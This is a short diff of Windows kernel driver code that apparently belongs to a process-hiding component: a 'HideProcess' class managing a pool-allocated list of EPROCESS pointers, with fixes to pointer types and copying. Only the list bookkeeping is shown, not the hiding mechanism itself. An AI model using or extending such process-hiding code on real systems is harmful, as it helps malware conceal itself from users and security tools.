@@ -4,22 +4,22 @@
 
 class HideProcess {
 public:
-	PEPROCESS* HiddenList = NULL;
+	PVOID HiddenList = NULL;
 	ULONG HiddenCount = 0;
 	SIZE_T BufferSize = 0;
 	BOOL AddToHidden(PEPROCESS AddHidden) {
-		PEPROCESS* TempHidden = (PEPROCESS*)ExAllocatePoolWithTag(NonPagedPool, BufferSize + sizeof(PEPROCESS), 'ThPb');
+		PVOID TempHidden = ExAllocatePoolWithTag(NonPagedPool, BufferSize + sizeof(PEPROCESS), 'ThPb');
 		if (TempHidden == NULL) {
 			return FALSE;
 		}
 		if (HiddenList != NULL) {
 			RtlCopyMemory(TempHidden, HiddenList, BufferSize);
 		}
-		RtlCopyMemory((PVOID)((SIZE_T)TempHidden + BufferSize), AddHidden, sizeof(PEPROCESS));
+		RtlCopyMemory((PVOID)((SIZE_T)TempHidden + BufferSize), &AddHidden, sizeof(PEPROCESS));
 		if (HiddenList != NULL) {
 			ExFreePool(HiddenList);
 		}
-		HiddenList = (PEPROCESS*)ExAllocatePoolWithTag(NonPagedPool, BufferSize + sizeof(PEPROCESS), 'HpMb');
+		HiddenList = ExAllocatePoolWithTag(NonPagedPool, BufferSize + sizeof(PEPROCESS), 'HpMb');
 		if (HiddenList == NULL) {
 			ExFreePool(TempHidden);
 			return FALSE;
